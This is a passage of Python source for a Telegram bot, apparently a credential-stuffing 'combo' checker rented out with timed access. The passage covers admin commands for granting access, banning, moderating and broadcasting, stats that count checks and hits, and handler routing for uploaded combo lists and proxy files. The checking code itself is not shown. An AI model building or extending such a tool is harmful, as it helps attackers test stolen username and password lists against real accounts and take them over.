            await reply(f"✅ Revoked access for `{target}`")
        elif cmd == 'addaccess' and len(parts) >= 3:
            target, days = int(parts[1]), int(parts[2])
            db.add_user(target, '', '')
            db.grant_timed_access(target, days)
            await reply(f"✅ Granted `{days}` days access to `{target}`")
        elif cmd == 'ban' and len(parts) >= 2:
            target = int(parts[1])
            db.ban(target)
            await reply(f"✅ Banned `{target}`")
        elif cmd == 'unban' and len(parts) >= 2:
            target = int(parts[1])
            db.unban(target)
            await reply(f"✅ Unbanned `{target}`")
        elif cmd == 'mod' and len(parts) >= 2:
            if uid != ADMIN_ID:
                await reply("❌ Owner only command.")
                return
            target = int(parts[1])
            db.add_user(target, '', '')
            db.set_mod(target, 1)
            await reply(f"✅ Modded `{target}`")
        elif cmd == 'unmod' and len(parts) >= 2:
            if uid != ADMIN_ID:
                await reply("❌ Owner only command.")
                return
            target = int(parts[1])
            db.set_mod(target, 0)
            await reply(f"✅ Unmodded `{target}`")
        elif cmd == 'info' and len(parts) >= 2:
            target = int(parts[1])
            info = db.get_user_info(target)
            if not info:
                await reply(f"❌ User `{target}` not found")
                return
            await reply(
                f"👤 *User Info*\n\n"
                f"ID: `{info['user_id']}`\n"
                f"Username: @{info['username'] or 'N/A'}\n"
                f"Name: {info['first_name'] or 'N/A'}\n"
                f"Credits: `{info['credits']}`\n"
                f"Access: `{'Yes' if info['has_access'] else 'No'}`\n"
                f"Banned: `{'Yes' if info['is_banned'] else 'No'}`\n"
                f"Mod: `{'Yes' if info['is_mod'] else 'No'}`\n"
                f"Checks: `{info['total_checks']}`\n"
                f"Hits: `{info['total_hits']}`\n"
                f"Joined: `{(info['join_date'] or '')[:10]}`\n"
                f"Expiry: `{(info['access_expiry'] or 'None')[:10]}`"
            )
        elif cmd == 'stats':
            s = db.get_global_stats()
            await reply(
                f"📊 *Global Stats*\n\n"
                f"👥 Total Users: `{s['total']}`\n"
                f"✅ Active Users: `{s['active']}`\n"
                f"🔍 Total Checks: `{s['checks']}`\n"
                f"🎯 Total Hits: `{s['hits']}`\n"
                f"🌐 Proxies: `{len(PROXIES_LIST)}`"
            )
        elif cmd == 'listmods':
            mods = db.list_mods()
            if not mods:
                await reply("No mods found.")
                return
            lst = '\n'.join([f"• `{m['uid']}` @{m['username'] or 'N/A'}" for m in mods])
            await reply(f"🛡 *Moderators:*\n\n{lst}")
        elif cmd == 'setthreads' and len(parts) >= 3:
            target, n = int(parts[1]), int(parts[2])
            db.update_settings(target, threads=n)
            await reply(f"✅ Set threads to `{n}` for `{target}`")
        elif cmd == 'broadcast' and len(parts) >= 2:
            # message is everything after !!broadcast
            bcast_msg = txt[len('!!broadcast'):].strip()
            if not bcast_msg:
                await reply("Usage: `!!broadcast your message here`")
                return
            uids = db.get_all_user_ids()
            sent = 0
            for tuid in uids:
                try:
                    await c.bot.send_message(
                        tuid,
                        f"📢 *Broadcast from {TAG}*\n\n{bcast_msg}",
                        parse_mode='Markdown')
                    sent += 1
                    await asyncio.sleep(0.05)
                except Exception:
                    pass
            await reply(f"✅ Broadcast sent to `{sent}/{len(uids)}` users")
        else:
            await reply("❌ Unknown command. Use `!!help`")
    except Exception as e:
        await u.message.reply_text(f"❌ Error: `{e}`", parse_mode='Markdown')


# ============================================================================
# MAIN
# ============================================================================
def bot_main_exec():
    logger.info(f"Starting AKAZA Bot — {TAG}")
    db.init_db()
    # Ensure admin exists and has access
    db.add_user(ADMIN_ID, 'larpsupport', 'Admin')
    db.grant_access(ADMIN_ID)

    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("threads", cmd_threads))
    app.add_handler(CommandHandler("keywords", cmd_keywords))
    app.add_handler(CommandHandler("addkw", cmd_addkw))
    app.add_handler(CommandHandler("clearkw", cmd_clearkw))
    app.add_handler(CommandHandler("fastmode", cmd_fastmode))
    app.add_handler(CommandHandler("check", single_check_cmd))
    app.add_handler(CommandHandler("stats", cmd_stats))

    # Callbacks
    app.add_handler(CallbackQueryHandler(cb_handler))

    # Admin !! commands (must be before combo handler)
    app.add_handler(MessageHandler(
        filters.TEXT & filters.Regex(r'^!!'),
        admin_cmd_handler))

    # Proxy upload (caption contains "proxy" or "prox")
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("txt") &
        filters.CAPTION,
        _route_doc_with_caption))

    # Combo file (no caption or non-proxy caption)
    app.add_handler(MessageHandler(
        filters.Document.FileExtension("txt"),
        handle_combo))

    # Combo text
    app.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND & filters.Regex(r'[^!].+:.+'),
        handle_combo))

    logger.info("Bot polling started")
    app.run_polling(drop_pending_updates=True)


async def _route_doc_with_caption(u: Update, c: ContextTypes.DEFAULT_TYPE):
    cap = (u.message.caption or '').lower()
    if 'prox' in cap or 'proxy' in cap:
        await handle_proxies(u, c)
    else:
        await handle_combo(u, c)


if __name__ == '__main__':
    bot_main_exec()
